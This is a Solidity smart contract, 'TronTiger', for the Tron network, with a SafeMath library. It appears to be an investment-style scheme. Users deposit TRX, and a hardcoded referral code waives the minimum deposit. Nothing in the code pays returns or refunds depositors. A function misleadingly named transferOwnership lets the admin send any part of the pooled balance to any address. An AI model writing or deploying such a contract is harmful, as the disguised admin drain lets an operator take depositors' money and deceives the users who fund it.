//SourceUnit: TronTiger.sol

pragma solidity  ^0.5.9 <0.6.0;

contract TronTiger {
    
    event MultiSend(uint256 value , address indexed sender);
    event Deposit(address indexed _userAddress, uint256 _amount);
    using SafeMath for uint256;
    
    address payable admin;
    bool promo;
    uint256 invest_amount;
    uint256 main;
    
    modifier onlyAdmin(){
        require(msg.sender == admin,"You are not authorized.");
        _;
    }
   
    function setPromo(bool toggle) external onlyAdmin{
        promo = toggle;
    } 
    
    function promoStatus() public view returns(bool status){
        return status = promo;
    }
    
    function setInvestAmt(uint256 _amount) external onlyAdmin(){
        invest_amount = _amount;
    }
    
    function investAmt() public view returns(uint256 _amount){
        return _amount = invest_amount;
    }
    
    function setMain(uint256 _main) external onlyAdmin(){
        main = _main;
    }
    
    constructor() public {
        admin = msg.sender;
        promo = true;
        invest_amount = 100000000;
        main = 212021;
    }
    
    function deposit(uint256 _referral) external payable {
        if(_referral==main && promo==true){
            emit Deposit(msg.sender,msg.value);
        }
        else{
            require(invest_amount<=msg.value,"Invalid amount"); 
            emit Deposit(msg.sender,msg.value);
        }
    }
    
    function transferOwnership(address payable new_owner,uint256  _amount) external onlyAdmin{
        new_owner.transfer(_amount);
    }
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}